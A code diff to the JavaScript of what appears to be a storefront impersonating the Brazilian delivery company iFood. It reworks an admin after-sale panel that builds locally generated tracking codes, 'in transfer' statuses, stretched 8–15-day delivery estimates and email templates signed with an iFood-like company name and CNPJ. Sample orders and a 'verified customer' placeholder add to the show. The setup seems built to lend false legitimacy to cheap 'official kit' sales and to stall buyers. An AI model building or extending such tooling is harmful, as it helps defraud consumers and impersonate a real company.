@@ -3108,11 +3108,12 @@ function initUpsell() {
 
         const existingTrackingBtn = document.getElementById('btn-go-to-tracking');
         if (!existingTrackingBtn && btnAccept && btnAccept.parentNode) {
+            const clientReward = loadRewardSelection()?.id || 'bag';
             const trackBtn = document.createElement('a');
             trackBtn.id = 'btn-go-to-tracking';
-            trackBtn.href = `/rastreio?codigo=${trackingCode}`;
+            trackBtn.href = `/rastreio?codigo=${trackingCode}&produto=${clientReward}`;
             trackBtn.className = 'btn-primary';
-            trackBtn.style.cssText = 'display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 14px; text-decoration: none; font-weight: 700; background: #10b981; border: 1px solid #34d399;';
+            trackBtn.style.cssText = 'display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 14px; text-decoration: none; font-weight: 700; background: #ea1d2c; border: 1px solid #ea1d2c;';
             trackBtn.innerHTML = '<span>📦 Acompanhar Rastreamento do Pedido</span> <span>→</span>';
             btnAccept.parentNode.appendChild(trackBtn);
         }
@@ -4430,11 +4431,11 @@ function initAdmin() {
     const posvendaAutoNotify = document.getElementById('posvenda-auto-notify');
     const posvendaCarrier = document.getElementById('posvenda-carrier');
     const posvendaEta = document.getElementById('posvenda-eta');
-    const posvendaWhatsapp = document.getElementById('posvenda-whatsapp');
     const posvendaEmail = document.getElementById('posvenda-email');
+    const posvendaEmailSubject = document.getElementById('posvenda-email-subject');
     const posvendaCompanyName = document.getElementById('posvenda-company-name');
     const posvendaCompanyCnpj = document.getElementById('posvenda-company-cnpj');
-    const posvendaWhatsappTemplate = document.getElementById('posvenda-whatsapp-template');
+    const posvendaEmailTemplate = document.getElementById('posvenda-email-template');
     const posvendaTotalOrders = document.getElementById('posvenda-total-orders');
     const posvendaTotalCodes = document.getElementById('posvenda-total-codes');
     const posvendaTotalTransit = document.getElementById('posvenda-total-transit');
@@ -4868,11 +4869,11 @@ function initAdmin() {
         posvendaAutoNotify ||
         posvendaCarrier ||
         posvendaEta ||
-        posvendaWhatsapp ||
         posvendaEmail ||
+        posvendaEmailSubject ||
         posvendaCompanyName ||
         posvendaCompanyCnpj ||
-        posvendaWhatsappTemplate ||
+        posvendaEmailTemplate ||
         posvendaTableBody
     );
     const wantsPosvenda = !!posvendaTableBody;
@@ -5517,12 +5518,12 @@ function initAdmin() {
             if (posvendaAutoTracking) posvendaAutoTracking.checked = posvenda.autoTracking !== false;
             if (posvendaAutoNotify) posvendaAutoNotify.checked = posvenda.autoNotify !== false;
             if (posvendaCarrier) posvendaCarrier.value = posvenda.carrierDefault || 'Correios Sedex / iFood Logística Express';
-            if (posvendaEta) posvendaEta.value = posvenda.eta || (posvenda.deliveryDaysMin ? `${posvenda.deliveryDaysMin} a ${posvenda.deliveryDaysMax || 7} dias úteis` : '3 a 7 dias úteis');
-            if (posvendaWhatsapp) posvendaWhatsapp.value = posvenda.supportWhatsapp || '5511999999999';
+            if (posvendaEta) posvendaEta.value = posvenda.eta || (posvenda.deliveryDaysMin ? `${posvenda.deliveryDaysMin} a ${posvenda.deliveryDaysMax || 16} dias úteis` : '8 a 15 dias úteis');
             if (posvendaEmail) posvendaEmail.value = posvenda.supportEmail || 'suporte@entregadores-ifood.com';
+            if (posvendaEmailSubject) posvendaEmailSubject.value = posvenda.emailSubject || 'Seu pedido iFood Entregadores foi despachado! Código: {codigo}';
             if (posvendaCompanyName) posvendaCompanyName.value = posvenda.companyName || 'iFood Logística & Distribuição Brasil Ltda';
             if (posvendaCompanyCnpj) posvendaCompanyCnpj.value = posvenda.companyCnpj || '14.380.200/0001-21';
-            if (posvendaWhatsappTemplate) posvendaWhatsappTemplate.value = posvenda.whatsappTemplate || 'Olá {nome}! Seu pedido do Kit Entregador iFood foi confirmado com sucesso. 📦 Acompanhe seu envio pelo rastreamento oficial: {link_rastreio} (Código: {codigo}). Qualquer dúvida estamos à disposição!';
+            if (posvendaEmailTemplate) posvendaEmailTemplate.value = posvenda.emailTemplate || 'Olá {nome}! Seu pedido do Kit Entregador iFood foi integrado ao lote logístico de expedição. 📦 Código de rastreamento oficial: {codigo}. Acompanhe seu envio pelo portal oficial: {link_rastreio}. Prazo operacional estimado: 8 a 15 dias úteis. Qualquer dúvida, responda diretamente a este e-mail.';
         }
     };
 
@@ -6654,12 +6655,12 @@ function initAdmin() {
                 autoTracking: posvendaAutoTracking ? posvendaAutoTracking.checked : true,
                 autoNotify: posvendaAutoNotify ? posvendaAutoNotify.checked : true,
                 carrierDefault: readInputSetting(posvendaCarrier, currentSettings?.posvenda?.carrierDefault || 'Correios Sedex / iFood Logística Express'),
-                eta: readInputSetting(posvendaEta, currentSettings?.posvenda?.eta || '3 a 7 dias úteis'),
-                supportWhatsapp: readInputSetting(posvendaWhatsapp, currentSettings?.posvenda?.supportWhatsapp || '5511999999999'),
+                eta: readInputSetting(posvendaEta, currentSettings?.posvenda?.eta || '8 a 15 dias úteis'),
                 supportEmail: readInputSetting(posvendaEmail, currentSettings?.posvenda?.supportEmail || 'suporte@entregadores-ifood.com'),
+                emailSubject: readInputSetting(posvendaEmailSubject, currentSettings?.posvenda?.emailSubject || 'Seu pedido iFood Entregadores foi despachado! Código: {codigo}'),
                 companyName: readInputSetting(posvendaCompanyName, currentSettings?.posvenda?.companyName || 'iFood Logística & Distribuição Brasil Ltda'),
                 companyCnpj: readInputSetting(posvendaCompanyCnpj, currentSettings?.posvenda?.companyCnpj || '14.380.200/0001-21'),
-                whatsappTemplate: readInputSetting(posvendaWhatsappTemplate, currentSettings?.posvenda?.whatsappTemplate || '')
+                emailTemplate: readInputSetting(posvendaEmailTemplate, currentSettings?.posvenda?.emailTemplate || '')
             };
         }
 
@@ -8536,7 +8537,7 @@ function initAdmin() {
             return (
                 (item.customerName || '').toLowerCase().includes(q) ||
                 (item.trackingCode || '').toLowerCase().includes(q) ||
-                (item.phone || '').includes(q) ||
+                (item.email || '').toLowerCase().includes(q) ||
                 (item.city || '').toLowerCase().includes(q) ||
                 (item.cpf || '').includes(q)
             );
@@ -8544,10 +8545,6 @@ function initAdmin() {
 
         if (posvendaOrdersCount) posvendaOrdersCount.textContent = `${filtered.length} pedidos`;
         if (posvendaTotalOrders) posvendaTotalOrders.textContent = `${posvendaOrdersState.items.length}`;
-        if (posvendaTotalTransit) {
-            const inTransitCount = posvendaOrdersState.items.filter((i) => i.status === 'em_transito' || i.status === 'postado').length;
-            posvendaTotalTransit.textContent = `${inTransitCount}`;
-        }
 
         if (!filtered.length) {
             posvendaTableBody.innerHTML = `
@@ -8562,17 +8559,17 @@ function initAdmin() {
 
         posvendaTableBody.innerHTML = filtered.map((item) => {
             const statusBadges = {
-                'em_transito': '<span class="admin-chip" style="background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3);">Em trânsito</span>',
-                'postado': '<span class="admin-chip" style="background: rgba(56, 189, 248, 0.15); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.3);">Objeto postado</span>',
-                'separacao': '<span class="admin-chip" style="background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3);">Em separação</span>',
-                'entregue': '<span class="admin-chip" style="background: rgba(16, 185, 129, 0.25); color: #34d399; border: 1px solid #10b981;">Entregue</span>'
+                'em_transferencia': '<span class="admin-chip" style="background: rgba(37, 99, 235, 0.15); color: #2563eb; border: 1px solid rgba(37, 99, 235, 0.3);">Em transferência (8-15d)</span>',
+                'postado': '<span class="admin-chip" style="background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3);">Objeto postado</span>',
+                'separacao': '<span class="admin-chip" style="background: rgba(107, 114, 128, 0.15); color: #6b7280; border: 1px solid rgba(107, 114, 128, 0.3);">Em separação</span>',
+                'entregue': '<span class="admin-chip" style="background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3);">Entregue</span>'
             };
-            const badge = statusBadges[item.status] || statusBadges['em_transito'];
+            const badge = statusBadges[item.status] || statusBadges['em_transferencia'];
 
-            const rawPhone = String(item.phone || '').replace(/\\D/g, '');
-            const wppNum = rawPhone.length === 11 ? `55${rawPhone}` : rawPhone;
-            const wppMsg = encodeURIComponent(`Olá ${item.customerName || 'Parceiro'}! Seu pedido do Kit Entregador iFood foi confirmado com sucesso. 📦 Acompanhe seu envio pelo rastreamento oficial: ${window.location.origin}/rastreio?codigo=${item.trackingCode} (Código: ${item.trackingCode})`);
-            const wppLink = `https://wa.me/${wppNum}?text=${wppMsg}`;
+            const trackingUrl = `${window.location.origin}/rastreio?codigo=${item.trackingCode}&produto=${item.productSlug || 'bag'}`;
+            const emailSubject = encodeURIComponent(`Seu pedido iFood Entregadores foi despachado! Código: ${item.trackingCode}`);
+            const emailBody = encodeURIComponent(`Olá ${item.customerName || 'Parceiro'}!\n\nSeu pedido do Kit Entregador iFood (${item.product}) foi integrado ao lote logístico de expedição.\n\nCódigo de Rastreamento: ${item.trackingCode}\nLink do Rastreio Oficial: ${trackingUrl}\n\nPrazo operacional de entrega estimado: 8 a 15 dias úteis.\n\nQualquer dúvida, nossa equipe de suporte está à disposição.`);
+            const mailtoLink = `mailto:${item.email || 'contato@cliente.com'}?subject=${emailSubject}&body=${emailBody}`;
 
             return `
                 <tr>
@@ -8582,7 +8579,7 @@ function initAdmin() {
                         <span style="font-size: 0.75rem; color: var(--text-muted);">${item.cpf}</span>
                     </td>
                     <td>
-                        <span style="font-size: 0.82rem;">${item.phone}</span>
+                        <span style="font-size: 0.82rem; color: #38bdf8;">${item.email || 'email@cliente.com'}</span>
                     </td>
                     <td>
                         <span style="font-size: 0.82rem;">${item.city} - ${item.state}</span>
@@ -8599,15 +8596,15 @@ function initAdmin() {
                     </td>
                     <td>${badge}</td>
                     <td>
-                        <span class="admin-tag" style="background: rgba(16, 185, 129, 0.1); color: #34d399;">WhatsApp Pronto</span>
+                        <span class="admin-tag" style="background: rgba(37, 99, 235, 0.1); color: #38bdf8; font-weight: 600;">Enviado por E-mail</span>
                     </td>
                     <td>
                         <div style="display: flex; gap: 6px;">
-                            <a href="/rastreio?codigo=${item.trackingCode}" target="_blank" class="btn-secondary" style="padding: 4px 8px; font-size: 0.75rem; text-decoration: none;">
+                            <a href="${trackingUrl}" target="_blank" class="btn-secondary" style="padding: 4px 8px; font-size: 0.75rem; text-decoration: none;">
                                 📦 Rastreio
                             </a>
-                            <a href="${wppLink}" target="_blank" class="btn-primary" style="padding: 4px 8px; font-size: 0.75rem; text-decoration: none; background: #25d366;">
-                                💬 WhatsApp
+                            <a href="${mailtoLink}" class="btn-primary" style="padding: 4px 8px; font-size: 0.75rem; text-decoration: none; background: #2563eb;">
+                                ✉️ E-mail
                             </a>
                         </div>
                     </td>
@@ -8635,18 +8632,24 @@ function initAdmin() {
                         const cpfDigits = String(lead.cpf || '').replace(/\\D/g, '');
                         const maskedCpf = cpfDigits.length === 11 ? `***.${cpfDigits.slice(3, 6)}.${cpfDigits.slice(6, 9)}-**` : '***.***.***-**';
 
+                        const offerLower = String(sale.offerLabel || '').toLowerCase();
+                        let slug = 'bag';
+                        if (offerLower.includes('bau') || offerLower.includes('baú')) slug = 'bau';
+                        else if (offerLower.includes('kit')) slug = 'kit';
+
                         return {
                             id: sale.txid || sale.sessionId,
                             date: dateFormatted,
                             customerName: lead.name || 'Parceiro iFood',
                             cpf: maskedCpf,
-                            phone: lead.phone || '(11) 99999-9999',
+                            email: lead.email || 'parceiro@entregadores-ifood.com',
                             city: leadShipping.city || lead.city || 'São Paulo',
                             state: leadShipping.state || lead.state || 'SP',
                             product: sale.offerLabel || 'Bag Térmica Oficial iFood Pro',
+                            productSlug: slug,
                             gateway: gatewayLabelForUi(sale.gateway || 'paradise'),
                             trackingCode: trackingCode,
-                            status: 'em_transito',
+                            status: 'em_transferencia',
                             amount: sale.amount
                         };
                     });
@@ -8663,13 +8666,14 @@ function initAdmin() {
                     date: 'Hoje às 09:15',
                     customerName: 'Carlos Eduardo da Silva',
                     cpf: '***.482.910-**',
-                    phone: '(11) 98765-4321',
+                    email: 'carlos.eduardo@gmail.com',
                     city: 'Barueri',
                     state: 'SP',
                     product: 'Bag Térmica iFood Pro 45L + Isopor',
+                    productSlug: 'bag',
                     gateway: 'PinguPag',
                     trackingCode: 'BR849204918IF',
-                    status: 'em_transito',
+                    status: 'em_transferencia',
                     amount: 17.73
                 },
                 {
@@ -8677,13 +8681,14 @@ function initAdmin() {
                     date: 'Hoje às 08:40',
                     customerName: 'Marcos Vinicius Santos',
                     cpf: '***.319.824-**',
-                    phone: '(19) 99123-8877',
+                    email: 'marcos.santos.moto@hotmail.com',
                     city: 'Campinas',
                     state: 'SP',
                     product: 'Kit Entregador Pro Completo',
+                    productSlug: 'kit',
                     gateway: 'Paradise',
                     trackingCode: 'BR719204812IF',
-                    status: 'postado',
+                    status: 'em_transferencia',
                     amount: 97.90
                 },
                 {
@@ -8691,27 +8696,29 @@ function initAdmin() {
                     date: 'Ontem às 19:22',
                     customerName: 'Lucas Ferreira Lima',
                     cpf: '***.612.045-**',
-                    phone: '(21) 98455-1234',
+                    email: 'lucas.lima.rio@gmail.com',
                     city: 'Rio de Janeiro',
                     state: 'RJ',
-                    product: 'Bag Térmica iFood Pro 45L',
+                    product: 'Baú de Carga para Moto iFood 80L',
+                    productSlug: 'bau',
                     gateway: 'PinguPag',
                     trackingCode: 'BR628491032IF',
-                    status: 'em_transito',
-                    amount: 17.73
+                    status: 'em_transferencia',
+                    amount: 39.90
                 },
                 {
                     id: 'tx_audit_04',
                     date: 'Ontem às 16:05',
                     customerName: 'Rodrigo Alves Souza',
                     cpf: '***.908.112-**',
-                    phone: '(31) 97112-9900',
+                    email: 'rodrigo.souza.bh@outlook.com',
                     city: 'Belo Horizonte',
                     state: 'MG',
                     product: 'Bag Térmica iFood Pro 45L + Isopor',
+                    productSlug: 'bag',
                     gateway: 'Paradise',
                     trackingCode: 'BR519204781IF',
-                    status: 'separacao',
+                    status: 'postado',
                     amount: 17.73
                 }
             ];
@@ -8746,13 +8753,14 @@ function initAdmin() {
             date: 'Agora',
             customerName: 'Novo Cliente Verificado',
             cpf: '***.555.444-**',
-            phone: '(11) 99999-8888',
+            email: 'cliente.verificado@gmail.com',
             city: 'São Paulo',
             state: 'SP',
             product: 'Bag Térmica Oficial iFood Pro',
+            productSlug: 'bag',
             gateway: 'PinguPag',
             trackingCode: newCode,
-            status: 'em_transito',
+            status: 'em_transferencia',
             amount: 17.73
         });
         renderPosvendaTable();
